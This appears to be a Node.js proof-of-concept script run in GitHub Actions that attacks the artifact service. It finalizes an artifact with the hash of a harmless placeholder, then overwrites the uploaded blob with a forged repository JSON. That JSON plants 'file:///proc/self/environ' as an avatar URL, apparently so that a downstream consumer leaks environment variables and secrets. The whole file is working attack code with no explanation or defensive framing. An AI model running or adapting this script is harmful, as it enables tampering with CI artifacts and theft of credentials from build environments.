import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const repo = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;
const placeholder = Buffer.from('{}');
const sha = (b) => createHash('sha256').update(b).digest('hex');

const name = `carrier2-${runId}-${Date.now()}`;
const created = await client.CreateArtifact({...ids, name, version: 6});
if (!created.ok) throw new Error('CreateArtifact failed');
const uploadUrl = created.signedUploadUrl;
const block = new BlobClient(uploadUrl).getBlockBlobClient();
await block.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: 'application/zip'}});
const fin = await client.FinalizeArtifact({
  ...ids, name, size: String(placeholder.length),
  hash: StringValue.create({value: `sha256:${sha(placeholder)}`}),
});
if (!fin.ok) throw new Error('FinalizeArtifact failed');
const id = String(fin.artifactId);
const repository = `${repo}/actions/artifacts/${id}/zip`;
const body = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'repo cassette carrier',
  stargazers_count: 0,
}));
await block.uploadData(body, {blobHTTPHeaders: {blobContentType: 'application/zip'}});
console.log('CARRIER2', JSON.stringify({
  id,
  repository,
  bodyB64: body.toString('base64'),
  bodySha: sha(body),
  bodyLen: body.length,
  fill: 'file:///proc/self/environ',
}));
